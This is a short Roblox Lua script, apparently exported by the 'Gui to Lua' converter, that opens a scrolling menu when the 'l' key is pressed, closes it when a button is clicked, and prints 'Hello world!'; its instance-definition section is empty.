-- Scripts:

local function DXFLH_fake_script() -- ScrollingFrame.LocalScript 
	local script = Instance.new('LocalScript', ScrollingFrame)

	local plr = game.Players.LocalPlayer

	plr:GetMouse().KeyDown:Connect(function(K)
		if K == "l" then
			script.Parent.Visible = true
		end
	end)
end
coroutine.wrap(DXFLH_fake_script)()
local function JUYKAIK_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
	end)
end
coroutine.wrap(JUYKAIK_fake_script)()
local function KAQIL_fake_script() -- ScreenGui.LocalScript 
	local script = Instance.new('LocalScript', ScreenGui)

	print("Hello world!")

end
coroutine.wrap(KAQIL_fake_script)()

-- Gui to Lua
-- Version: 3.2

-- Instances:

